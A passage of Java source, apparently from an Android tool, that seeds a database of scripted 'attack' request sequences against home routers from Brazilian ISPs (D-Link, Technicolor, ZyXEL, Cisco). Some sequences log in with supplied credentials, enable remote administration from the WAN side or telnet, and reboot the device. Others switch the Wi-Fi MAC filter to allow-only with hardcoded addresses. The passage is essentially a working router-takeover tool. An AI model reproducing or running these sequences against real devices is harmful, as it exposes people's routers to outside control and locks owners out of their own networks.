				mParamsDao.insert(new Params(62, 101, "CiscoNumberOfCpes", "insereCiscoNumberOfCpes"));		//119
				mParamsDao.insert(new Params(63, 101, "CiscoLeaseTime", "insereCiscoLeaseTime"));		//60
				mParamsDao.insert(new Params(64, 101, "CiscoPrimaryDnsIpAddressIP0", "8"));
				mParamsDao.insert(new Params(65, 101, "CiscoPrimaryDnsIpAddressIP1", "8"));
				mParamsDao.insert(new Params(66, 101, "CiscoPrimaryDnsIpAddressIP2", "8"));
				mParamsDao.insert(new Params(67, 101, "CiscoPrimaryDnsIpAddressIP3", "8"));
				mParamsDao.insert(new Params(68, 101, "CiscoSecondaryDnsIpAddressIP0", "8"));
				mParamsDao.insert(new Params(69, 101, "CiscoSecondaryDnsIpAddressIP1", "8"));
				mParamsDao.insert(new Params(70, 101, "CiscoSecondaryDnsIpAddressIP2", "4"));
				mParamsDao.insert(new Params(71, 101, "CiscoSecondaryDnsIpAddressIP3", "4"));
				mParamsDao.insert(new Params(72, 101, "CiscoTertiaryDnsIpAddressIP0", "0"));
				mParamsDao.insert(new Params(73, 101, "CiscoTertiaryDnsIpAddressIP1", "0"));
				mParamsDao.insert(new Params(74, 101, "CiscoTertiaryDnsIpAddressIP2", "0"));
				mParamsDao.insert(new Params(75, 101, "CiscoTertiaryDnsIpAddressIP3", "0"));
				mParamsDao.insert(new Params(76, 101, "CiscoTimeZone", "25"));		
				mParamsDao.insert(new Params(77, 101, "DaylightSavingMinutes", "insereDaylightSavingMinutes"));		//0
				mParamsDao.insert(new Params(78, 101, "h_DaylightSavingEnable", "insereh_DaylightSavingEnable"));		//disable
				mParamsDao.insert(new Params(79, 101, "NewNtpTimeServer", "insereNewNtpTimeServer"));		//
				mParamsDao.insert(new Params(80, 101, "addNtpServer", "insereaddNtpServer"));		//0
				mParamsDao.insert(new Params(81, 101, "removeNtpServer", "insereremoveNtpServer"));		//0
				mParamsDao.insert(new Params(82, 101, "TimeSntpEnable", "insereTimeSntpEnable"));		//1
				mParamsDao.insert(new Params(83, 101, "save", "Save Settings"));
				mParamsDao.insert(new Params(84, 101, "CiscoApplyRgSetupAction", "1"));
			mPostGetDao.insert(new PostGet(102, 12, 5, "get", "/index.asp", "", 0));
			mPostGetDao.insert(new PostGet(103, 12, 6, "get", "/Administration.asp", "Management", 0));
			mPostGetDao.insert(new PostGet(104, 12, 7, "get", "/Devicerestart.asp", "Device Restart", 0));
			mPostGetDao.insert(new PostGet(105, 12, 8, "post", "/goform/Devicerestart", "", 1));														
				mParamsDao.insert(new Params(85, 101, "devicerestrat_Password_check", "insereSenha"));
				mParamsDao.insert(new Params(86, 101, "mtenRestore", "Device Restart"));
				mParamsDao.insert(new Params(87, 101, "devicerestart", "1"));
				mParamsDao.insert(new Params(88, 101, "devicerestrat_getUsercheck", "true"));
			mPostGetDao.insert(new PostGet(106, 12, 9, "get", "/index.asp", "", 0));
			
		/*********************************************************End DNS*********************************************************/
		
			
		/****************************************************Start Acesso Remoto**************************************************/
//		GVT D-Link DSL-2640B		
		mAtaqueDao.insert(new Ataque(13, "acesso", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(107, 13, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(108, 13, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(109, 13, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(110, 13, 4, "get", "/info.html", "DSL-2640B", 1));
			mPostGetDao.insert(new PostGet(111, 13, 5, "get", "/backupsettings.html", "", 1));
			mPostGetDao.insert(new PostGet(112, 13, 6, "get", "/scsrvcntr.html", "HTTP", 1));
			mPostGetDao.insert(new PostGet(113, 13, 7, "get", "/scsrvcntr.cmd?servicelist=HTTP=1,1,80;" +
																						  "TELNET=1,0,23;" +
																						  "SSH=0,0,22;" +
																						  "FTP=0,0,21;" +
																						  "TFTP=0,0,69;" +
																						  "ICMP=1,0,0;" +
																						  "SNMP=0,0,161;", "", 1));	
			mPostGetDao.insert(new PostGet(114, 13, 8, "get", "/resetrouter.html", "", 1));
			mPostGetDao.insert(new PostGet(115, 13, 9, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));			

//		Oi technicolor TD5136v2	/ TD5130v2		
		mAtaqueDao.insert(new Ataque(14, "acesso", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(116, 14, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(89, 116, "isSubmit", "1"));
				mParamsDao.insert(new Params(90, 116, "username", "insereUsuario"));
				mParamsDao.insert(new Params(91, 116, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(117, 14, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(118, 14, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(119, 14, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(120, 14, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));			
			mPostGetDao.insert(new PostGet(121, 14, 6, "get", "/remoteMgmt.cgi", "", 0));
			mPostGetDao.insert(new PostGet(122, 14, 7, "post", "/remoteMgmt.cgi", "", 0));
				mParamsDao.insert(new Params(92, 122, "setobject_http_enabled", "1"));
				mParamsDao.insert(new Params(93, 122, "setobject_http_port", "51003"));
				mParamsDao.insert(new Params(94, 122, "setobject_https_enabled", "IGNORE"));			
				mParamsDao.insert(new Params(95, 122, "setobject_https_port", "0"));
				mParamsDao.insert(new Params(96, 122, "setobject_cli_enabled", "IGNORE"));
				mParamsDao.insert(new Params(97, 122, "setobject_cli_port", "0"));		
				mParamsDao.insert(new Params(98, 122, "setobject_cli_session_timeout", "0"));
				mParamsDao.insert(new Params(99, 122, "setobject_ssh_enabled", "IGNORE"));			//desnecessario no TD5310v2
				mParamsDao.insert(new Params(100, 122, "setobject_snmp_enabled", "IGNORE"));
				mParamsDao.insert(new Params(101, 122, "action", "apply"));					
			mPostGetDao.insert(new PostGet(123, 14, 8, "get", "/reboot.cgi", "want to reboot the device", 0));	
			mPostGetDao.insert(new PostGet(124, 14, 9, "post", "/reboot.cgi", "System rebooting", 0));		//TIMEOUT		
				mParamsDao.insert(new Params(102, 124, "submitValue", "redirect"));						
			mPostGetDao.insert(new PostGet(125, 14, 10, "post", "/reboot.cgi", "", 0));	
				mParamsDao.insert(new Params(103, 125, "submitValue", "apply"));

//		Oi ZyXEL AMG1202-T10B
		mAtaqueDao.insert(new Ataque(15, "acesso", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(126, 15, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(104, 126, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(105, 126, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(127, 15, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(128, 15, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(129, 15, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(130, 15, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(131, 15, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(132, 15, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(133, 15, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(134, 15, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(135, 15, 10, "get", "/cgi-bin/RemMagWWW.asp", "RemMagWWW", 0));	
			mPostGetDao.insert(new PostGet(136, 15, 11, "get", "/cgi-bin/buttom.asp", "", 0));	
			mPostGetDao.insert(new PostGet(137, 15, 12, "post", "/cgi-bin/RemMagWWW.asp", "RemMagWWW", 0));											
				mParamsDao.insert(new Params(106, 137, "WWWAccessInterface", "Both"));
				mParamsDao.insert(new Params(107, 137, "btnwww2", "0.0.0.0"));											
				mParamsDao.insert(new Params(108, 137, "RemMagWWW_H", "1"));
				mParamsDao.insert(new Params(109, 137, "PageNum", "1"));										
				mParamsDao.insert(new Params(110, 137, "Activate_H", "Yes"));
				mParamsDao.insert(new Params(111, 137, "Application_H", "Web"));										
				mParamsDao.insert(new Params(112, 137, "radioFlag", "1"));
				mParamsDao.insert(new Params(113, 137, "IP_H", "0.0.0.0"));
			mPostGetDao.insert(new PostGet(138, 15, 13, "get", "/cgi-bin/buttom.asp", "", 0));	
			mPostGetDao.insert(new PostGet(139, 15, 14, "get", "/cgi-bin/rpFWUpload.asp", "", 0));	
			mPostGetDao.insert(new PostGet(140, 15, 15, "get", "/cgi-bin/rpSysReboot.asp", "want to restart", 0));
			mPostGetDao.insert(new PostGet(141, 15, 16, "get", "/cgi-bin/buttom.asp", "", 0));
			mPostGetDao.insert(new PostGet(142, 15, 17, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));	

//		NET Cisco DPC3925		***DONT WORK***			
		mAtaqueDao.insert(new Ataque(16, "acesso", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(143, 16, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(114, 143, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(115, 143, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(116, 143, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(117, 143, "Language_Submit", "0"));
				mParamsDao.insert(new Params(118, 143, "login", "Log In"));
			mPostGetDao.insert(new PostGet(144, 16, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
			mPostGetDao.insert(new PostGet(145, 16, 3, "get", "/Administration.asp", "<input name=\"saRgIpMgmtWanDualIpAddrIP0\" title=\"Wan Dual Ip Address First Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP1\" title=\"Wan Dual Ip Address Second Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP2\" title=\"Wan Dual Ip Address Third Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
																					 "<input name=\"saRgIpMgmtWanDualIpAddrIP3\" title=\"Wan Dual Ip Address Fourth Octet\" size=3 maxlength=3 class=\'ipnum\' value=(.*?)>;;" +
																					 "<input type=\"CheckBox\" name=\"saRgIpMgmtWanDualIpRipAdvertised\" id=\"saRgIpMgmtWanDualIpRipAdvertised\" value=\"(.*?)\";" + 
																					 "<input  id=\"wan_mtuSize\" name=\"wan_mtuSize\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"4\" maxlength=\"4\" />;;" +
																					 "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysPasswd\" name=\"sysPasswd\" value=\"(.*?)\" />;;" +
																					 "<INPUT type=\"password\" maxlength=\"65\" size=\"21\" id=\"sysConfirmPasswd\" name=\"sysConfirmPasswd\" value=\"(.*?)\" />;;" +
																					 "<input type=\"hidden\" name=\"preWorkingMode\" value=(.*?)>;;" +
																					 "<input type=\"hidden\" name=\"h_check_WebAccessUserIfLevel\" value=(.*?)>;;" +
																					 "<input type=\"hidden\" name=\"h_upnp_enable\" value=(.*?)>;;" +
																					 "<input type=\"hidden\" name=\"h_wlan_enable\" value=(.*?)>;;" +
																					 "<input type=\"hidden\" name=\"h_igmp_proxy_enable\" value=(.*?)>;;" +
																					 "<input type=\"hidden\" name=\"h_user_type\" value=(.*?)>;;", 0));		
			mPostGetDao.insert(new PostGet(146, 16, 4, "post", "/goform/Administration.asp", "", 1));														
				mParamsDao.insert(new Params(119, 146, "working_mode", "0"));		//Router Mode
				mParamsDao.insert(new Params(120, 146, "connection_mode", "0"));		//DHCP
				mParamsDao.insert(new Params(121, 146, "saRgIpMgmtWanDualIpAddrIP0", "inseresaRgIpMgmtWanDualIpAddrIP0"));		//0
				mParamsDao.insert(new Params(122, 146, "saRgIpMgmtWanDualIpAddrIP1", "inseresaRgIpMgmtWanDualIpAddrIP1"));		//0
				mParamsDao.insert(new Params(123, 146, "saRgIpMgmtWanDualIpAddrIP2", "inseresaRgIpMgmtWanDualIpAddrIP2"));		//0
				mParamsDao.insert(new Params(124, 146, "saRgIpMgmtWanDualIpAddrIP3", "inseresaRgIpMgmtWanDualIpAddrIP3"));		//0
				mParamsDao.insert(new Params(125, 146, "saRgIpMgmtWanDualIpRipAdvertised", "inseresaRgIpMgmtWanDualIpRipAdvertised"));		//0x0
				mParamsDao.insert(new Params(126, 146, "wan_ip_1", "0"));
				mParamsDao.insert(new Params(127, 146, "wan_ip_2", "0"));
				mParamsDao.insert(new Params(128, 146, "wan_ip_3", "0"));
				mParamsDao.insert(new Params(129, 146, "wan_ip_4", "0"));
				mParamsDao.insert(new Params(130, 146, "wan_mask_1", "0"));
				mParamsDao.insert(new Params(131, 146, "wan_mask_2", "0"));
				mParamsDao.insert(new Params(132, 146, "wan_mask_3", "0"));
				mParamsDao.insert(new Params(133, 146, "wan_mask_4", "0"));
				mParamsDao.insert(new Params(134, 146, "wan_gw_1", "0"));
				mParamsDao.insert(new Params(135, 146, "wan_gw_2", "0"));
				mParamsDao.insert(new Params(136, 146, "wan_gw_3", "0"));
				mParamsDao.insert(new Params(137, 146, "wan_gw_4", "0"));
				mParamsDao.insert(new Params(138, 146, "Host_Name", ""));
				mParamsDao.insert(new Params(139, 146, "Domain_Name", ""));
				mParamsDao.insert(new Params(140, 146, "wan_dns1_1", "0"));
				mParamsDao.insert(new Params(141, 146, "wan_dns1_2", "0"));
				mParamsDao.insert(new Params(142, 146, "wan_dns1_3", "0"));
				mParamsDao.insert(new Params(143, 146, "wan_dns1_4", "0"));
				mParamsDao.insert(new Params(144, 146, "wan_dns2_1", "0"));
				mParamsDao.insert(new Params(145, 146, "wan_dns2_2", "0"));
				mParamsDao.insert(new Params(146, 146, "wan_dns2_3", "0"));
				mParamsDao.insert(new Params(147, 146, "wan_dns2_4", "0"));
				mParamsDao.insert(new Params(148, 146, "wan_mtuSize", "inserewan_mtuSize"));		//0
				mParamsDao.insert(new Params(149, 146, "sysname", "insereUsuario"));		//zqf5nw2x
				mParamsDao.insert(new Params(150, 146, "sysPasswd", "inseresysPasswd"));		//
				mParamsDao.insert(new Params(151, 146, "sysConfirmPasswd", "inseresysConfirmPasswd"));		//
				mParamsDao.insert(new Params(152, 146, "remote_management", "enable"));
				mParamsDao.insert(new Params(153, 146, "http_wanport", "8080"));
				mParamsDao.insert(new Params(154, 146, "upnp_enable", "insereh_upnp_enable"));		//disable	
				mParamsDao.insert(new Params(155, 146, "igmp_proxy_enable", "insereh_igmp_proxy_enable"));		//enable			
				mParamsDao.insert(new Params(156, 146, "save", "Save Settings"));
				mParamsDao.insert(new Params(157, 146, "preWorkingMode", "inserepreWorkingMode"));		//1
				mParamsDao.insert(new Params(158, 146, "h_remote_management", "enable"));
				mParamsDao.insert(new Params(159, 146, "h_check_WebAccessUserIfLevel", "insereh_check_WebAccessUserIfLevel"));		//2
				mParamsDao.insert(new Params(160, 146, "h_upnp_enable", "insereh_upnp_enable"));		//disable
				mParamsDao.insert(new Params(161, 146, "h_wlan_enable", "insereh_wlan_enable"));		//enable
				mParamsDao.insert(new Params(162, 146, "h_igmp_proxy_enable", "insereh_igmp_proxy_enable"));			//enable		
				mParamsDao.insert(new Params(163, 146, "h_user_type", "insereh_user_type"));		//common
			mPostGetDao.insert(new PostGet(147, 16, 5, "get", "/Administration.asp", "", 0));	
			mPostGetDao.insert(new PostGet(148, 16, 6, "get", "/Devicerestart.asp", "Device Restart", 0));
			mPostGetDao.insert(new PostGet(149, 16, 7, "post", "/goform/Devicerestart", "", 1));														
				mParamsDao.insert(new Params(164, 149, "devicerestrat_Password_check", "insereSenha"));
				mParamsDao.insert(new Params(165, 149, "mtenRestore", "Device Restart"));
				mParamsDao.insert(new Params(166, 149, "devicerestart", "1"));
				mParamsDao.insert(new Params(167, 149, "devicerestrat_getUsercheck", "true"));
			mPostGetDao.insert(new PostGet(150, 16, 8, "get", "/index.asp", "", 0));
			
		/*****************************************************End Acesso Remoto***************************************************/
				
		
		/*****************************************************Start Filtro MAC****************************************************/	
//		GVT D-Link DSL-2640B
		mAtaqueDao.insert(new Ataque(17, "filtromac", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(151, 17, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(152, 17, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(153, 17, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(154, 17, 4, "get", "/info.html", "DSL-2640B", 1));
			mPostGetDao.insert(new PostGet(155, 17, 5, "get", "/wlswitchinterface0.wl", "", 1));
			mPostGetDao.insert(new PostGet(156, 17, 6, "get", "/wlmacflt.cmd?action=view", "", 1));
			mPostGetDao.insert(new PostGet(157, 17, 7, "get", "/wlmacflt.html", "", 1));
			mPostGetDao.insert(new PostGet(158, 17, 8, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=90:00:4E:AC:F6:B5", "", 1));
			mPostGetDao.insert(new PostGet(159, 17, 9, "get", "/wlmacflt.cmd?action=view", "", 1));
			mPostGetDao.insert(new PostGet(160, 17, 10, "get", "/wlmacflt.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(161, 17, 11, "get", "/wlmacflt.html", "", 1));
			mPostGetDao.insert(new PostGet(162, 17, 12, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=insereMAC", "", 1));		//34:bb:26:60:62:0d
			mPostGetDao.insert(new PostGet(163, 17, 13, "get", "/wlmacflt.cmd?action=view", "", 1));
			mPostGetDao.insert(new PostGet(164, 17, 14, "get", "/wlmacflt.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(165, 17, 15, "get", "/wlmacflt.cmd?action=save&wlFltMacMode=allow", "", 1));
			mPostGetDao.insert(new PostGet(166, 17, 16, "get", "/wlmacflt.cmd?action=apply", "", 1));		//TIMEOUT SOMETIMES	
			mPostGetDao.insert(new PostGet(167, 17, 17, "get", "/resetrouter.html", "", 1));
			mPostGetDao.insert(new PostGet(168, 17, 18, "get", "/backupsettings.html", "", 1));
			mPostGetDao.insert(new PostGet(169, 17, 19, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));

//		Oi technicolor TD5136v2 / TD5130v2		***DONT WORK***	
		mAtaqueDao.insert(new Ataque(18, "filtromac", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(170, 18, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(168, 170, "isSubmit", "1"));
				mParamsDao.insert(new Params(169, 170, "username", "insereUsuario"));
				mParamsDao.insert(new Params(170, 170, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(171, 18, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(172, 18, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(173, 18, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(174, 18, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));
			mPostGetDao.insert(new PostGet(175, 18, 6, "get", "/wladvsettings.cgi", "", 0));
			mPostGetDao.insert(new PostGet(176, 18, 7, "get", "/wlactrl.cgi", "", 0));
			mPostGetDao.insert(new PostGet(177, 18, 8, "post", "/wlactrl.cgi", "", 0));		//TIMEOUT	
				mParamsDao.insert(new Params(171, 177, "submitValue", "2"));
				mParamsDao.insert(new Params(172, 177, "delList", ""));
				mParamsDao.insert(new Params(173, 177, "wlanDisabled", "ON"));	
				mParamsDao.insert(new Params(174, 177, "wlanAcEnabled", "0"));
				mParamsDao.insert(new Params(175, 177, "mac", "90004EACF6B5"));		
			mPostGetDao.insert(new PostGet(178, 18, 9, "get", "/wladvsettings.cgi", "", 0));	
			mPostGetDao.insert(new PostGet(179, 18, 10, "get", "/wlactrl.cgi", "", 0));
			mPostGetDao.insert(new PostGet(180, 18, 11, "post", "/wlactrl.cgi", "", 0));		//TIMEOUT
				mParamsDao.insert(new Params(176, 180, "submitValue", "2"));
				mParamsDao.insert(new Params(177, 180, "delList", ""));
				mParamsDao.insert(new Params(178, 180, "wlanDisabled", "ON"));	
				mParamsDao.insert(new Params(179, 180, "wlanAcEnabled", "0"));
				mParamsDao.insert(new Params(180, 180, "mac", "insereMac:"));		//34BB2660620D
			mPostGetDao.insert(new PostGet(181, 18, 12, "get", "/wladvsettings.cgi", "", 0));	
			mPostGetDao.insert(new PostGet(182, 18, 13, "get", "/wlactrl.cgi", "", 0));		
			mPostGetDao.insert(new PostGet(183, 18, 14, "post", "/wlactrl.cgi", "", 0));	//TIMEOUT
				mParamsDao.insert(new Params(181, 183, "submitValue", "1"));
				mParamsDao.insert(new Params(182, 183, "delList", ""));
				mParamsDao.insert(new Params(183, 183, "wlanDisabled", "ON"));	
				mParamsDao.insert(new Params(184, 183, "wlanAcEnabled", "1"));
				mParamsDao.insert(new Params(185, 183, "mac", ""));		
			mPostGetDao.insert(new PostGet(184, 18, 15, "get", "/reboot.cgi", "want to reboot the device", 0));	
			mPostGetDao.insert(new PostGet(185, 18, 16, "post", "/reboot.cgi", "System rebooting", 0));
				mParamsDao.insert(new Params(186, 185, "submitValue", "redirect"));						
			mPostGetDao.insert(new PostGet(186, 18, 17, "post", "/reboot.cgi", "", 0));	
				mParamsDao.insert(new Params(187, 186, "submitValue", "apply"));

//		Oi ZyXEL AMG1202-T10B		***DONT WORK***
		mAtaqueDao.insert(new Ataque(19, "filtromac", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(187, 19, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(188, 187, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(189, 187, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(188, 19, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(189, 19, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(190, 19, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(191, 19, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(192, 19, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(193, 19, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(194, 19, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(195, 19, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(196, 19, 10, "get", "/cgi-bin/WLAN_General.asp?MSSID=0", "", 0));		//TIMEOUT		
			mPostGetDao.insert(new PostGet(197, 19, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(198, 19, 12, "get", "/cgi-bin/WLAN_APFilter_Edit.asp", "", 0));		
			mPostGetDao.insert(new PostGet(199, 19, 13, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(200, 19, 14, "post", "/cgi-bin/cgi-bin/WLAN_APFilter_Edit.asp", "", 0));												
				mParamsDao.insert(new Params(190, 200, "WLAN_APFltActive", "on"));
				mParamsDao.insert(new Params(191, 200, "APFltFlag", "1"));
				mParamsDao.insert(new Params(192, 200, "WLAN_APFltAction", "1"));
				mParamsDao.insert(new Params(193, 200, "AP_FltAddress0", "90:00:4E:AC:F6:B5"));
				mParamsDao.insert(new Params(194, 200, "AP_FltAddress1", "34:BB:26:60:62:0D"));
				mParamsDao.insert(new Params(195, 200, "AP_FltAddress2=", ""));
				mParamsDao.insert(new Params(196, 200, "AP_FltAddress3=", ""));
				mParamsDao.insert(new Params(197, 200, "AP_FltAddress4=", ""));
				mParamsDao.insert(new Params(198, 200, "AP_FltAddress5=", ""));
				mParamsDao.insert(new Params(199, 200, "AP_FltAddress6=", ""));
				mParamsDao.insert(new Params(200, 200, "AP_FltAddress7=", ""));
				mParamsDao.insert(new Params(201, 200, "Submit", "Apply"));
				mParamsDao.insert(new Params(202, 200, "APFilterButtonFG", ""));	
			mPostGetDao.insert(new PostGet(201, 19, 15, "get", "/cgi-bin/buttom.asp", "", 0));			
			mPostGetDao.insert(new PostGet(202, 19, 16, "get", "/cgi-bin/rpFWUpload.asp", "Firmware Version", 0));		
			mPostGetDao.insert(new PostGet(203, 19, 17, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(204, 19, 18, "get", "/cgi-bin/rpSysReboot.asp", "want to restart", 0));
			mPostGetDao.insert(new PostGet(205, 19, 19, "get", "/cgi-bin/buttom.asp", "", 0));
			mPostGetDao.insert(new PostGet(206, 19, 20, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));	
		
//		NET Cisco DPC3925		***DONT WORK***			
		mAtaqueDao.insert(new Ataque(20, "filtromac", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(207, 20, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(203, 207, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(204, 207, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(205, 207, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(206, 207, "Language_Submit", "0"));
				mParamsDao.insert(new Params(207, 207, "login", "Log In"));
			mPostGetDao.insert(new PostGet(208, 20, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
			mPostGetDao.insert(new PostGet(209, 20, 3, "get", "/WPS.asp", "", 0));
			mPostGetDao.insert(new PostGet(210, 20, 4, "get", "/WMACFilter.asp", "", 0));
			mPostGetDao.insert(new PostGet(211, 20, 5, "post", "/goform/WMACFilter", "", 0));													
				mParamsDao.insert(new Params(208, 211, "wl0_macfilter", "enable"));
				mParamsDao.insert(new Params(209, 211, "wl0_macmode", "allow"));
				mParamsDao.insert(new Params(210, 211, "wl_mac0", "90:00:4E:AC:F6:B5"));
				mParamsDao.insert(new Params(211, 211, "wl_mac1", "34:BB:26:60:62:0D"));				
				mParamsDao.insert(new Params(212, 211, "wl_mac2", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(213, 211, "wl_mac3", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(214, 211, "wl_mac4", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(215, 211, "wl_mac5", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(216, 211, "wl_mac6", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(217, 211, "wl_mac7", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(218, 211, "wl_mac8", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(219, 211, "wl_mac9", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(220, 211, "wl_mac10", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(221, 211, "wl_mac11", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(222, 211, "wl_mac12", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(223, 211, "wl_mac13", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(224, 211, "wl_mac14", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(225, 211, "wl_mac15", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(226, 211, "wl_mac16", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(227, 211, "wl_mac17", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(228, 211, "wl_mac18", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(229, 211, "wl_mac19", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(230, 211, "wl_mac20", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(231, 211, "wl_mac21", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(232, 211, "wl_mac22", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(233, 211, "wl_mac23", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(234, 211, "wl_mac24", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(235, 211, "wl_mac25", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(236, 211, "wl_mac26", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(237, 211, "wl_mac27", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(238, 211, "wl_mac28", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(239, 211, "wl_mac29", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(240, 211, "wl_mac30", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(241, 211, "wl_mac31", "00:00:00:00:00:00"));
				mParamsDao.insert(new Params(242, 211, "save", "Save Settings"));
				mParamsDao.insert(new Params(243, 211, "h_wl0_macfilter", "enable"));
				mParamsDao.insert(new Params(244, 211, "h_wl0_macmode", "allow"));		
			mPostGetDao.insert(new PostGet(212, 20, 6, "get", "/WMACFilter.asp", "", 0));
